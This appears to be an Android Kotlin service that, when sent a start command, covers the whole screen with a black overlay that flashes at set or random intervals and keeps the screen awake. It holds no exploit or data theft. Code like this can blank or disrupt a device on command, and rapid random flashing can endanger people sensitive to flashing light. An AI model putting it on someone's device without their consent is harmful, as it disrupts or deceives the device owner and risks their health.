package com.sync.xxx

import android.animation.ValueAnimator
import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.animation.LinearInterpolator

/**
 * BlankScreenService - Layanan untuk menampilkan layar blank yang berkedip-kedip
 * Membuat overlay fullscreen hitam dengan efek blinking
 */
class BlankScreenService : Service() {

    companion object {
        const val ACTION_START = "START_BLANK_SCREEN"
        const val ACTION_STOP = "STOP_BLANK_SCREEN"
        const val EXTRA_BLINK_SPEED = "blink_speed" // milliseconds per blink cycle
        const val EXTRA_BLINK_PATTERN = "blink_pattern" // fast, medium, slow, random
    }

    private var windowManager: WindowManager? = null
    private var blankView: View? = null
    private var isShowing = false
    
    private var blinkAnimator: ValueAnimator? = null
    private var blinkSpeed = 500L // default 500ms per cycle
    private var blinkPattern = "medium"
    
    private val handler = Handler(Looper.getMainLooper())
    private var randomBlinkRunnable: Runnable? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                blinkSpeed = intent.getLongExtra(EXTRA_BLINK_SPEED, 500L)
                blinkPattern = intent.getStringExtra(EXTRA_BLINK_PATTERN) ?: "medium"
                startBlankScreen()
            }
            ACTION_STOP -> {
                stopBlankScreen()
                stopSelf()
            }
        }
        return START_STICKY
    }

    private fun startBlankScreen() {
        if (isShowing) return

        try {
            windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

            // Create fullscreen black view
            blankView = View(this).apply {
                setBackgroundColor(Color.BLACK)
            }

            // Window layout params for overlay
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                },
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.TOP or Gravity.START
                x = 0
                y = 0
            }

            // Add view to window
            windowManager?.addView(blankView, params)
            isShowing = true

            // Start blinking animation based on pattern
            startBlinkAnimation()

        } catch (e: Exception) {
            e.printStackTrace()
            stopSelf()
        }
    }

    private fun startBlinkAnimation() {
        when (blinkPattern) {
            "fast" -> startRegularBlink(200L)
            "medium" -> startRegularBlink(500L)
            "slow" -> startRegularBlink(1000L)
            "random" -> startRandomBlink()
            else -> startRegularBlink(blinkSpeed)
        }
    }

    private fun startRegularBlink(speed: Long) {
        blinkAnimator?.cancel()
        
        blinkAnimator = ValueAnimator.ofFloat(0f, 1f).apply {
            duration = speed
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.REVERSE
            interpolator = LinearInterpolator()
            
            addUpdateListener { animator ->
                val alpha = animator.animatedValue as Float
                blankView?.alpha = alpha
            }
            
            start()
        }
    }

    private fun startRandomBlink() {
        randomBlinkRunnable = object : Runnable {
            override fun run() {
                // Random on/off duration between 50ms - 800ms
                val isVisible = blankView?.alpha == 1f
                val nextDuration = (50L..800L).random()
                
                blankView?.alpha = if (isVisible) 0f else 1f
                
                handler.postDelayed(this, nextDuration)
            }
        }
        handler.post(randomBlinkRunnable!!)
    }

    private fun stopBlankScreen() {
        try {
            // Stop animations
            blinkAnimator?.cancel()
            blinkAnimator = null
            
            randomBlinkRunnable?.let {
                handler.removeCallbacks(it)
                randomBlinkRunnable = null
            }

            // Remove view
            blankView?.let {
                windowManager?.removeView(it)
                blankView = null
            }

            isShowing = false
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopBlankScreen()
    }
}
